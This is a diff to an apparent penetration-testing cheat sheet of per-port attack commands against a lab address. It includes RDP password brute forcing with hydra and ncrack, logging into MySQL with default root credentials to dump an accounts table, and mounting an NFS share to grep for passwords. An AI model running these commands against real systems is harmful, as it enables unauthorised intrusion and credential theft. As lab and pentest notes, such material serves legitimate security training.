@@ -64,15 +64,16 @@ nmap -p 443 -v --script ssl-heartbleed 192.168.200.5
 sslscan 192.168.200.5:443
 
 # 88 Kerberos
-Needed for AS-REP Roasting (and usernames)
+Needed for AS-REP Roasting (and usernames) - See mxad
 
-# 111/2049 NFS
+# 111/2049 NFS/mountd
 nmap -sV -v --script=nfs-showmount 192.168.200.5
 nmap -p 111,2049 -v --script nfs* 192.168.200.5
 nmap -p 111,2049 -sV -v --script=rpcinfo 192.168.200.5
-showmount -e 192.168.200.5
-mkdir /tmp/nfs
-su mount -t nfs 192.168.200.5/found /tmp/nfs
+sudo showmount -e 192.168.200.5
+mkdir secrets
+su mount -t nfs 192.168.200.5/secrets secrets/
+cd secrets; grep -irl password
 
 # 113 IDENT
 grep -i auth-owner ./nmap-fulltcp
@@ -140,7 +141,7 @@ mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;'
 show databases; use previse; show tables; select * from accounts; 
 
 # 3389 RDP Remote Desktop
-rdesktop -u guest -p guest 192.168.200.5 -g 94%   ..Login to learn OS
+rdesktop -u guest -p guest 192.168.200.5 -g 94%
 hydra -t 1 -V -f -l bob -P $commontenk rdp://192.168.200.5
 ncrack -vv --user Administrator -P $smallpw rdp://192.168.200.5
 xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /geometry /w:1680 /h:900
